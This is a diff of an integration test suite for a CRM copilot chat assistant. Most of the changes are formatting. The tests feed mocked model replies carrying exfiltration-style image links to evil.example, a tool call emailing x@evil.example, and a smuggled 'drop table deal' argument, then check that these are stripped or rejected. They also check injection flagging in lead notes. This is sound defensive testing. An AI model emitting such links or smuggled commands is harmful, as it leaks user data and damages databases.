@@ -10,8 +10,9 @@ import { agentRun, copilotConversation } from './db/schema-copilot.ts';
 import { purgeExpiredConversations } from './modules/copilot/conversations.ts';
 import { CANARIES, INJECTIONS, seedCopilotDemo, seedId } from './modules/copilot/demo-seed.ts';
 import { hasInvisible } from './modules/copilot/text.ts';
+import { runScheduledScans } from './modules/workflow.ts';
 import { schema } from './platform/core.ts';
-import { AiProviderError, type AiConverseRequest } from './platform/ports.ts';
+import { type AiConverseRequest, AiProviderError } from './platform/ports.ts';
 
 const texts = (events: SseEvent[], name: string) => events.filter((e) => e.event === name);
 const done = (events: SseEvent[]) => events.find((e) => e.event === 'done')?.data;
@@ -54,7 +55,7 @@ describe.skipIf(!hasTestDb())('Copilot chat, read-only (PostgreSQL integration)'
 
   it('answers a question as a stream: status, tool lines, text, then a checked answer with sources', async () => {
     kit.ai.enqueueConverse({ text: 'Let me look.', toolCalls: [{ name: 'list_deals', input: { status: 'open', limit: 3 } }] }, (req) => {
-      const result = JSON.parse((req.messages.at(-1)?.content[0] as { content: string }).content);
+      const result = JSON.parse((req.messages.at(-1)?.content[0] as { content: string } | undefined)?.content ?? '{}');
       return { text: `You have ${result.total} open deals. The latest is ${result.rows[0].name} [${result.rows[0].ref}].` };
     });
     const r = await ask('spidey', 'How many open deals do I have?');
@@ -124,7 +125,16 @@ describe.skipIf(!hasTestDb())('Copilot chat, read-only (PostgreSQL integration)'
     }
     // Listing everything a manager may see contains no Guardians or deactivated-rep canary either.
     kit.ai.reset();
-    kit.ai.enqueueConverse({ toolCalls: [{ name: 'list_deals', input: { limit: 25 } }, { name: 'list_leads', input: { limit: 25 } }, { name: 'search_records', input: { query: 'CNRY' } }] }, { text: 'Listed.' });
+    kit.ai.enqueueConverse(
+      {
+        toolCalls: [
+          { name: 'list_deals', input: { limit: 25 } },
+          { name: 'list_leads', input: { limit: 25 } },
+          { name: 'search_records', input: { query: 'CNRY' } },
+        ],
+      },
+      { text: 'Listed.' },
+    );
     const all = await ask('cap', 'List everything');
     expect(all.text + kit.ai.converseCalls.map(sent).join('')).not.toMatch(/CNRY-/);
     // The owner does see her own canary lead (the scope works both ways).
@@ -156,7 +166,9 @@ describe.skipIf(!hasTestDb())('Copilot chat, read-only (PostgreSQL integration)'
     kit.ai.reset();
     kit.clock.now = new Date(kit.clock.now.getTime() + 61_000);
     kit.ai.enqueueConverse({ toolCalls: [{ name: 'kpis', input: {} }] }, { text: 'You won 424242 deals.' }, (req) => {
-      const k = JSON.parse((req.messages.find((m) => m.content.some((b) => b.type === 'tool_result'))?.content[0] as { content: string }).content);
+      const k = JSON.parse(
+        (req.messages.find((m) => m.content.some((b) => b.type === 'tool_result'))?.content[0] as { content: string } | undefined)?.content ?? '{}',
+      );
       return { text: `You won ${k.dealsWon} deals.` };
     });
     const fixed = await ask('spidey', 'How many deals did I win?');
@@ -165,7 +177,9 @@ describe.skipIf(!hasTestDb())('Copilot chat, read-only (PostgreSQL integration)'
   });
 
   it('answers are plain text: images, links, web addresses and HTML are removed', async () => {
-    kit.ai.enqueueConverse({ text: 'Here you go ![logo](https://evil.example/p.png?d=secret) and [click](https://evil.example/x) or http://evil.example/collect <img src="https://evil.example/a.gif"> done.' });
+    kit.ai.enqueueConverse({
+      text: 'Here you go ![logo](https://evil.example/p.png?d=secret) and [click](https://evil.example/x) or http://evil.example/collect <img src="https://evil.example/a.gif"> done.',
+    });
     const r = await ask('spidey', 'hello');
     expect(r.done.answer).not.toMatch(/https?:|evil\.example|<img|!\[/);
     expect(r.done.answer).toContain('click');
@@ -180,7 +194,7 @@ describe.skipIf(!hasTestDb())('Copilot chat, read-only (PostgreSQL integration)'
     expect(noted.done.tainted).toBe(true);
     expect(noted.done.flags).toContain('outside_text_looked_like_instructions');
     const toolResult = JSON.stringify(kit.ai.converseCalls.at(-1)?.messages);
-    expect(toolResult).toMatch(/untrusted_document_[0-9a-f]{16} source=\\\\"lead notes\\\\"/);
+    expect(toolResult).toMatch(/untrusted_document_[0-9a-f]{16} source=\\*"lead notes\\*"/);
     const [run] = await kit.ctx.db.select().from(agentRun).where(eq(agentRun.id, noted.done.runId));
     expect(run).toMatchObject({ tainted: true });
     expect(run?.injectionFlags).toBeGreaterThan(0);
@@ -230,11 +244,17 @@ describe.skipIf(!hasTestDb())('Copilot chat, read-only (PostgreSQL integration)'
 
   it('rejects unknown tools, tools of another role and invalid arguments without running anything', async () => {
     kit.ai.enqueueConverse(
-      { toolCalls: [{ name: 'send_proposal', input: { to: 'x@evil.example' } }, { name: 'sales_brief_latest', input: {} }, { name: 'list_deals', input: { status: 'open', sql: 'drop table deal' } }] },
+      {
+        toolCalls: [
+          { name: 'send_proposal', input: { to: 'x@evil.example' } },
+          { name: 'sales_brief_latest', input: {} },
+          { name: 'list_deals', input: { status: 'open', sql: 'drop table deal' } },
+        ],
+      },
       { text: 'Nothing done.' },
     );
     const r = await ask('spidey', 'try things');
-    const results = JSON.stringify(kit.ai.converseCalls.at(-1)?.messages.at(-1));
+    const results = JSON.stringify(kit.ai.converseCalls.at(-1)?.messages.filter((m) => m.content.some((b) => b.type === 'tool_result')));
     expect(results.match(/unknown_tool/g)).toHaveLength(2);
     expect(results).toContain('invalid_input');
     expect(r.done.status).toBe('completed');
@@ -262,7 +282,7 @@ describe.skipIf(!hasTestDb())('Copilot chat, read-only (PostgreSQL integration)'
     expect(await purgeExpiredConversations(kit.ctx)).toBe(0);
     kit.clock.now = new Date(kit.clock.now.getTime() + 31 * 86_400_000);
     expect((await kit.call('spidey', 'GET', `/copilot/conversations/${id}`)).status).toBe(404); // expired even before the purge runs
-    expect(await purgeExpiredConversations(kit.ctx)).toBeGreaterThan(0);
+    expect((await runScheduledScans(kit.ctx)).copilot.conversationsPurged).toBeGreaterThan(0); // the nightly scans purge
     expect(await kit.ctx.db.select().from(copilotConversation).where(eq(copilotConversation.id, id))).toHaveLength(0);
   });
 });
